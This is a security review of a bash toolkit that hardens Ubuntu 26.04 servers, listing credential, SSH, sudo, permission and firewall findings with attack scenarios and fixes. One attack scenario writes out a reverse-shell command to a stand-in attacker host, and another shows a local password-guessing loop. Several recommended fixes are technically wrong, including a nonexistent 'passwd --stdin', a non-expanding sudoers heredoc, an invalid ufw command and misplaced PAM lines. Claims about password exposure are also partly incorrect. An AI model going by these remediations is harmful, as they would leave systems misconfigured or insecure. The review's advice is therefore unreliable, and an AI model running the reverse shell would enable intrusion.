# Security Review: Ubuntu 26.04 LTS Configuration Toolkit
**Reviewed from the perspective of a penetration tester / security professional**

**Date:** 2026-05-15  
**Reviewer:** Security Assessment  
**Severity Ratings:** CRITICAL | HIGH | MEDIUM | LOW

---

## Executive Summary

This bash-based configuration toolkit implements strong hardening practices (AppArmor, auditd, firewall, sysctl hardening) and follows secure coding patterns (idempotency checks, proper templating). However, several **credential handling and privilege escalation** vulnerabilities require immediate remediation, alongside gaps in SSH hardening, sudo configuration, and logging security.

---

## CRITICAL Issues

### 1. **Password Exposure in Process Memory and Logs** (CRITICAL - CVE-class)

**Location:** `scripts/01-base-config.sh:63, 82`
```bash
echo "${ADMIN_USER}:${ADMIN_PASSWORD}" | run_quiet chpasswd
```

**Risk:**  
- Password visible in `/proc/[pid]/environ` and `/proc/[pid]/cmdline` while command executes
- Potential exposure in log files if logging captures stderr/stdout
- Violates NIST SP 800-63B credential management guidance
- Violates CIS Benchmark recommendations

**Attack Scenario:**
1. Attacker gains unprivileged access to system (weak firewall rule, service exploit)
2. Attacker runs `ps aux` while toolkit runs → captures plaintext password
3. Attacker gains sudo/root access via compromised admin credentials

**Remediation:**
```bash
# Use stdin redirection instead of pipe (password not in argv)
chpasswd <<< "${ADMIN_USER}:${ADMIN_PASSWORD}"

# Better: Use mkpasswd + usermod to avoid exposure
hashed_pass=$(mkpasswd -m sha-512 "$ADMIN_PASSWORD")
usermod -p "$hashed_pass" "$ADMIN_USER"

# Best: Use `passwd` with stdin (no shell exposure)
echo "$ADMIN_PASSWORD" | passwd "$ADMIN_USER" --stdin
```

**CVSS Score:** 8.4 (High) - Requires local access but exposes high-value credentials

---

### 2. **Credentials Stored in Environment Variables Without Zeroization** (CRITICAL)

**Location:** `lib/questionnaire.sh`, `main.sh:482-485`, `scripts/01-base-config.sh:88`

**Risk:**
- `ADMIN_PASSWORD` held in memory until `unset ADMIN_PASSWORD` (line 88)
- Can be dumped via `/proc/[pid]/environ` by ANY local process during long-running modules
- Config files (`defaults.conf`) must be kept in `.gitignore` but this is manual → human error risk
- No automatic cleanup on script exit/crash

**Attack Scenario:**
1. Attacker runs `cat /proc/<toolkit_pid>/environ` while module 01 runs
2. Extracts `ADMIN_PASSWORD=...`
3. Toolkit crashes before reaching line 88 → password persists in memory

**Remediation:**
```bash
# 1. Add trap to zeroize on exit/error
cleanup_credentials() {
    [ -n "${ADMIN_PASSWORD:-}" ] && ADMIN_PASSWORD=""
    [ -n "${SMTP_PASSWORD:-}" ] && SMTP_PASSWORD=""
}
trap cleanup_credentials EXIT INT TERM

# 2. Use /dev/shm (tmpfs) for credential files instead of variables
pass_file="/dev/shm/toolkit_creds_$$.txt"
trap 'rm -f "$pass_file"' EXIT
chmod 600 "$pass_file"
echo "$ADMIN_PASSWORD" > "$pass_file"
# Read from file when needed, don't store in variables

# 3. Minimize credential lifetime
# Only load ADMIN_PASSWORD immediately before use; unset immediately after
```

**CVSS Score:** 9.1 (Critical) - Local unprivileged user can extract plaintext credentials

---

### 3. **No SSH Key-Based Authentication Setup** (CRITICAL)

**Location:** `scripts/01-base-config.sh` - creates user but no SSH key support

**Risk:**
- Toolkit creates admin user with **password-only** authentication
- No provision for SSH keys (`~/.ssh/authorized_keys`)
- Admin forced to use password login → vulnerable to brute-force, keylogging, MitM
- No fallback for compromised password without physical access

**Attack Scenario:**
1. Attacker brute-forces SSH password (weak pass, no rate limiting at time of setup)
2. Gains admin access; escalates to root via sudo
3. No log of how attacker obtained credentials (keylogging assumed)

**Remediation:**
```bash
# Add to 01-base-config.sh after user creation
if [ -n "${ADMIN_SSH_PUBKEY:-}" ]; then
    mkdir -p "/home/${ADMIN_USER}/.ssh"
    echo "$ADMIN_SSH_PUBKEY" >> "/home/${ADMIN_USER}/.ssh/authorized_keys"
    chmod 700 "/home/${ADMIN_USER}/.ssh"
    chmod 600 "/home/${ADMIN_USER}/.ssh/authorized_keys"
    chown -R "${ADMIN_USER}:${ADMIN_USER}" "/home/${ADMIN_USER}/.ssh"
    log_info "SSH public key added for $ADMIN_USER"
fi

# Consider disabling password auth entirely in sshd_config
# Add to templates or 06-hardening:
grep -q "^PasswordAuthentication no" /etc/ssh/sshd_config || \
    echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
systemctl reload sshd
```

**CVSS Score:** 8.2 (High) - No fallback authentication method; password-only is weak

---

### 4. **Insufficient Sudo Restrictions** (CRITICAL)

**Location:** `scripts/01-base-config.sh:71` adds user to `sudo` group with no restrictions

**Risk:**
- Admin user can run `sudo -i` → interactive root shell (no logging)
- No sudoers file restrictions (e.g., NOPASSWD, command whitelisting)
- Admin user can modify `/etc/sudoers` directly → persistent root access
- No audit trail of what root commands admin runs

**Attack Scenario:**
1. Attacker compromises admin account (weak password from earlier)
2. Runs `sudo -i` → interactive root shell with no sudo logging (auditd may not capture)
3. Attacker disables security tools, exfiltrates data, etc.
4. No way to audit what admin ran as root

**Remediation:**
```bash
# Create restricted sudoers config
cat > /etc/sudoers.d/toolkit-admin <<'EOF'
# Restrict admin user to essential commands only
Defaults:${ADMIN_USER} use_pty,log_input,log_output
%sudo ALL=(ALL) ALL  # Allow sudo for all commands but with logging

# OR more restrictive:
# %sudo ALL=(ALL) NOPASSWD: /usr/sbin/systemctl, /usr/bin/apt-get
EOF

chmod 0440 /etc/sudoers.d/toolkit-admin

# Enable sudoers event logging in auditd
# Add to templates/auditd.rules:
# -w /etc/sudoers.d/ -p wa -k sudo_changes
# -a always,exit -F arch=b64 -S execve -F uid>=1000 -F auid!=-1 -k sudo_commands
```

**CVSS Score:** 8.7 (High) - Unrestricted root access via sudo without logging

---

## HIGH-Risk Issues

### 5. **SSH Server Hardening Not Implemented** (HIGH)

**Location:** No `sshd_config` hardening in toolkit

**Risk:**
- SSH runs with default Ubuntu settings (potentially permissive)
- No mention of:
  - `PermitRootLogin no`
  - `PasswordAuthentication no` (if SSH keys available)
  - `PubkeyAuthentication yes` enforcement
  - `X11Forwarding no`
  - `AllowTcpForwarding no` (unless needed)
  - `MaxAuthTries 3`
  - `MaxSessions 2`

**Attack Scenario:**
1. Attacker port-scans and finds SSH open
2. Brute-forces weak password or exploits unpatched SSH version
3. Gains shell access without detection

**Remediation:**
```bash
# Add to scripts/06-hardening.sh or new scripts/04-ssh-hardening.sh

cat > /etc/ssh/sshd_config.d/99-toolkit.conf <<'EOF'
# SSH Server Hardening — Ubuntu 26.04 Toolkit

# Authentication
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
MaxAuthTries 3
MaxSessions 2

# Security
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no
PermitTunnel no
GatewayPorts no
ClientAliveInterval 300
ClientAliveCountMax 2

# Logging
SyslogFacility AUTH
LogLevel VERBOSE

# Protocol
Protocol 2
HostKey /etc/ssh/ssh_host_ed25519_key
HostKey /etc/ssh/ssh_host_rsa_key
KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512
Ciphers chacha20-poly1305@openssh.com,aes-256-gcm@openssh.com
MACs umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com
EOF

chmod 600 /etc/ssh/sshd_config.d/99-toolkit.conf
systemctl reload ssh
```

**CVSS Score:** 7.5 (High) - SSH is primary attack vector for Linux systems

---

### 6. **State File Permissions Not Enforced** (HIGH)

**Location:** `lib/state.sh:20-23` creates `.state` file with default umask

**Risk:**
- `/.state` file contains list of completed modules with timestamps
- If default umask is 0022 → world-readable (`-rw-r--r--`)
- Unprivileged users can read execution state, identify partially-completed configurations
- Potential information disclosure about system setup

**Attack Scenario:**
1. Attacker gains unprivileged shell access
2. Reads `/var/log/toolkit-setup/.state` → sees which modules ran
3. Identifies gaps (e.g., if hardening failed → finds unpatched kernel)
4. Targets those weaknesses

**Remediation:**
```bash
# lib/state.sh - modify state_init()
state_init() {
    mkdir -p "$TOOLKIT_PERSISTENT_DIR"
    touch "$TOOLKIT_PERSISTENT_DIR/.state"
    chmod 600 "$TOOLKIT_PERSISTENT_DIR/.state"  # ← ADD THIS
    chmod 700 "$TOOLKIT_PERSISTENT_DIR"        # ← ADD THIS
}

# Verify in module that creates dir
mkdir -p "$TOOLKIT_PERSISTENT_DIR"
chmod 700 "$TOOLKIT_PERSISTENT_DIR"  # root-only
```

**CVSS Score:** 6.5 (Medium-High) - Information disclosure to local users

---

### 7. **Audit Rules File Permissions Too Permissive** (HIGH)

**Location:** `scripts/06-hardening.sh:56` installs with mode `0640`

**Risk:**
- auditd rules file `/etc/audit/rules.d/99-toolkit.rules` is mode `0640`
- May be readable by group `adm` or others depending on umask
- Rules file discloses monitoring strategy (what's audited, what's not)
- Attacker can read rules and plan evasion

**Attack Scenario:**
1. Attacker gains access as `adm` group user
2. Reads `/etc/audit/rules.d/99-toolkit.rules`
3. Sees that `/bin/bash` is NOT monitored → uses bash for hidden commands
4. See `/etc/sudoers` IS monitored → uses other privilege escalation methods

**Remediation:**
```bash
# scripts/06-hardening.sh - change mode to 0600
if system_file_install "$rules_template" "$rules_target" 0600; then  # ← change from 0640
    if command -v augenrules >/dev/null 2>&1; then
        run_quiet augenrules --load || ...
    fi
fi
```

**CVSS Score:** 5.5 (Medium) - Information disclosure for audit evasion

---

## MEDIUM-Risk Issues

### 8. **Logging File Permissions Not Enforced** (MEDIUM)

**Location:** `lib/log.sh:71-72` writes to `$TOOLKIT_LOG_FILE` with default umask

**Risk:**
- Log file `/var/log/toolkit-setup/toolkit-setup.log` may be world-readable
- Contains INFO/DEBUG logs with sensitive info (hostnames, IP addresses, services installed)
- Unprivileged users learn system configuration

**Attack Scenario:**
1. Unprivileged user reads toolkit logs
2. Discovers all installed services, kernel hardening settings, network config
3. Plans targeted attacks knowing exact hardening measures in place

**Remediation:**
```bash
# main.sh - after creating log dir
mkdir -p "$TOOLKIT_PERSISTENT_DIR"
chmod 700 "$TOOLKIT_PERSISTENT_DIR"

# Alternatively, specify log file permissions:
# lib/log.sh - after creating/opening log file
if [ -f "$TOOLKIT_LOG_FILE" ]; then
    chmod 600 "$TOOLKIT_LOG_FILE"
fi
```

**CVSS Score:** 5.3 (Medium) - Configuration information disclosure

---

### 9. **No Root Password Change** (MEDIUM)

**Location:** `scripts/01-base-config.sh` - no root password set/changed

**Risk:**
- Root account password may be default or unset (allowing `sudo` bypass in misconfigured systems)
- If root has no password → `sudo -i` or `su -` without password possible if misconfigured
- No documented way to lock root account or set strong password

**Attack Scenario:**
1. Attacker gains unprivileged access to system
2. Attempts `sudo -i` without password (if sudo misconfigured to allow)
3. Gains root access immediately

**Remediation:**
```bash
# Add to 01-base-config.sh
# Lock root account (set password to !, disable direct login)
if [ "$PLAN_MODE" = "1" ]; then
    log_info "PLAN: would lock root account"
else
    usermod -L root  # Lock with '!' prefix
    log_info "Root account locked (sudo access only)"
fi

# OR if need emergency root access:
if [ -n "${ROOT_PASSWORD:-}" ]; then
    echo "root:${ROOT_PASSWORD}" | chpasswd  # Same password security issue as above
fi
```

**CVSS Score:** 5.9 (Medium) - Potential privilege escalation

---

### 10. **Incomplete Network Hardening** (MEDIUM)

**Location:** `scripts/03-network-hardening.sh` - UFW allows all outgoing

**Risk:**
- UFW configured with `default allow outgoing` (line 54)
- System can exfiltrate data to attacker-controlled servers
- No outbound filtering for compromised services
- Cannot prevent command-and-control (C2) callbacks

**Attack Scenario:**
1. Attacker exploits service vulnerability (e.g., unpatched postfix)
2. Executes reverse shell: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`
3. UFW allows outbound → C2 connection succeeds
4. Attacker has full shell access

**Remediation:**
```bash
# scripts/03-network-hardening.sh - add outbound restrictions
run_quiet ufw default deny incoming
run_quiet ufw default deny outgoing  # ← CHANGE from allow
run_quiet ufw allow out 53/udp comment 'DNS'
run_quiet ufw allow out 123/udp comment 'NTP'
run_quiet ufw allow out 80/tcp comment 'HTTP'
run_quiet ufw allow out 443/tcp comment 'HTTPS'
# Add SMTP if mail relay needed:
run_quiet ufw allow out ${SMTP_RELAY_PORT}/tcp comment "SMTP-Relay"
```

**CVSS Score:** 6.5 (Medium) - Enables lateral movement and data exfiltration

---

### 11. **No Account Lockout Policy** (MEDIUM)

**Location:** Fail2ban configured but no PAM account lockout

**Risk:**
- Fail2ban bans IPs, but doesn't lock accounts after failed local attempts
- Local attacker can brute-force admin password without IP ban
- No `/etc/pam.d/common-password` or `/etc/security/faillock.conf` configuration

**Attack Scenario:**
1. Attacker gains unprivileged local access
2. Runs `while true; do su - admin; done` (password guessing)
3. No account lockout → can try unlimited passwords locally
4. Eventually guesses weak password

**Remediation:**
```bash
# Add to scripts/06-hardening.sh
# Configure pam_faillock for account lockout
cat >> /etc/pam.d/common-auth <<'EOF'
# Account lockout after 5 failures for 15 minutes
auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900
auth [default=die] pam_faillock.so authfail audit deny=5 unlock_time=900
EOF

# Also configure
cat >> /etc/pam.d/common-account <<'EOF'
account required pam_faillock.so
EOF
```

**CVSS Score:** 6.3 (Medium) - Weak protection against local brute-force

---

### 12. **Umask Not Explicitly Set** (MEDIUM)

**Location:** No explicit umask configuration in toolkit

**Risk:**
- Files created may have overly permissive defaults (depends on system umask)
- Some sensitive files (SSH keys, cron scripts) may be world-readable
- System files installed by modules inherit world-readable permissions

**Attack Scenario:**
1. Toolkit runs with umask 0022 → files created as 644 (world-readable)
2. Attacker reads `/etc/cron.d/disk-alert` → learns alert infrastructure
3. Reads `/usr/local/bin/disk-alert.sh` → finds hardcoded credentials or API keys

**Remediation:**
```bash
# main.sh - set at start
umask 0077  # restrictive: files created as 600, dirs as 700

# scripts/08-mail-alerting.sh:63 - explicitly set permissions
chmod 0600 "$env_dir/daily-report.env" "$env_dir/disk-alert.env"

# Verify cron files
chmod 0644 /etc/cron.d/daily-report /etc/cron.d/disk-alert  # cron expects 644
```

**CVSS Score:** 5.2 (Medium) - Information disclosure

---

## LOW-Risk Issues & Recommendations

### 13. **No Grub/BIOS Password** (LOW)

**Risk:** Physical attacker can boot into GRUB and modify kernel parameters  
**Recommendation:** Add GRUB password if physical security is a concern:
```bash
grub-mkpasswd-pbkdf2  # Generate password
# Add to /etc/grub.d/40_custom and regenerate
```

---

### 14. **IPv6 Completely Disabled** (LOW)

**Risk:** May break legitimate IPv6 use cases; overly aggressive  
**Recommendation:** Document why IPv6 disabled; consider disabling at network layer instead:
```bash
# Instead of sysctl disable, use UFW:
ufw default deny in ipv6  # if IPv6 needed in future
```

---

### 15. **No Secrets Scanning in Git Pre-Commit** (LOW)

**Risk:** Sensitive data (API keys, passwords) could be committed  
**Recommendation:** Add `.pre-commit-config.yaml`:
```yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
```

---

### 16. **No Emergency Root Recovery Procedure Documented** (LOW)

**Risk:** If admin user compromised/locked, no documented recovery path  
**Recommendation:** Document GRUB/BIOS/rescue mode procedure in README

---

### 17. **Postfix Relay Credentials Not Secured** (LOW)

**Location:** `scripts/08-mail-alerting.sh:24-26` — SMTP relay host/port in plaintext

**Risk:** No authentication for SMTP relay; assumes trusted network  
**Recommendation:** If SMTP auth needed, store in separate restricted file:
```bash
cat > /etc/postfix/sasl_passwd <<EOF
[${SMTP_RELAY_HOST}]:${SMTP_RELAY_PORT} ${SMTP_USER}:${SMTP_PASSWORD}
EOF
chmod 600 /etc/postfix/sasl_passwd
postmap /etc/postfix/sasl_passwd
```

---

## Good Security Practices (Implemented)

✅ **Strong Sysctl Hardening** — `kernel.dmesg_restrict`, `kernel.yama.ptrace_scope`, network hardening  
✅ **AppArmor Enforcement** — Verified enabled and enforced  
✅ **Auditd Configured** — System call and file access monitoring  
✅ **UFW Firewall** — Default-deny-in, explicit allow-out, SSH-only by default  
✅ **Fail2ban** — SSH brute-force protection  
✅ **Unattended Upgrades** — Automatic security patching  
✅ **Cloud-init Disabled** — Prevents cloud-specific initialization exploits  
✅ **Idempotency** — Modules can be re-run safely  
✅ **Plan Mode** — Read-only audit capability  
✅ **Module Dependency DAG** — Ensures correct execution order  
✅ **Proper Logging** — Structured logs with timestamps and severity  
✅ **Config Gitignore** — Credentials not committed to git  

---

## Remediation Priority

| Priority | Issue | CVE-like Impact |
|----------|-------|---|
| **P0-CRITICAL** | Password in process list (issue #1) | Direct credential theft |
| **P0-CRITICAL** | Environment variable zeroization (issue #2) | Memory-based credential theft |
| **P0-CRITICAL** | SSH key setup missing (issue #3) | Password-only auth bypass |
| **P0-CRITICAL** | Sudo restrictions missing (issue #4) | Unrestricted root escalation |
| **P1-HIGH** | SSH hardening missing (issue #5) | Brute-force, weak ciphers |
| **P1-HIGH** | State file permissions (issue #6) | Configuration disclosure |
| **P1-HIGH** | Audit rules permissions (issue #7) | Audit evasion planning |
| **P2-MEDIUM** | Log file permissions (issue #8) | System info disclosure |
| **P2-MEDIUM** | Root password missing (issue #9) | Privilege escalation |
| **P2-MEDIUM** | Network egress filtering (issue #10) | Data exfiltration |

---

## Testing Recommendations

```bash
# 1. Verify no password exposure during toolkit run
strace -e trace=execve ./main.sh 2>&1 | grep -i password

# 2. Check file permissions after toolkit completes
ls -la /var/log/toolkit-setup/
stat /etc/audit/rules.d/99-toolkit.rules
stat /etc/ssh/sshd_config.d/99-toolkit.conf

# 3. Verify sudo restrictions
sudo -l  # Verify output
grep -A5 "^%sudo" /etc/sudoers.d/*

# 4. Check SSH hardening
sshd -T | grep -E "permitrootlogin|passwordauth|maxauthtries"

# 5. Test firewall
ufw status verbose
```

---

## Conclusion

The toolkit provides **strong foundational hardening** (sysctl, AppArmor, auditd, UFW) but suffers from **critical credential handling vulnerabilities** that expose admin passwords to local privilege escalation attacks. 

**Immediate action required** for issues #1-4 before deploying to production. Issues #5-7 should be addressed in the next development cycle.

Recommend conducting **post-remediation penetration testing** with focus on:
- Local privilege escalation from unprivileged user
- SSH brute-force and weak authentication
- Information disclosure via readable system files
- Audit evasion techniques

